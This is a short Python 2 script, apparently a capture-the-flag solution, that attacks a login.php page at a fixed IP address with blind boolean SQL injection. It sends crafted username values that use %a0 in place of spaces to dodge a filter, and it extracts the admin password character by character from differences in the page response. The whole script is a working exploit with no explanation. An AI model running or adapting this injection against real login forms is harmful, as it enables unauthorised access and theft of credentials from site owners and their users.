# coding:utf8
import urllib2

url = "http://124.128.55.5:8013/login.php"
data = "abcdefghijklmnopqrstuvwxyz1234567890"
xx = ""
flag = 0
listdata = list(data)
for jj in range(0, 33)[::-1]:
    # print jj
    for ii in listdata:
        post_data = "username=admin'=(select(select(substring(pass%a0from%a0" + str(
            jj) + "))from%a0admin%a0where%a0username='admin')='" + ii + xx + "')='1'='1&pass=2"
        # print post_data
        req = urllib2.urlopen(url, post_data).read()
        if (req.find('密码') > -1):
            flag = 1
            xx = ii + xx
            print xx
            break
        else:
            flag = 0
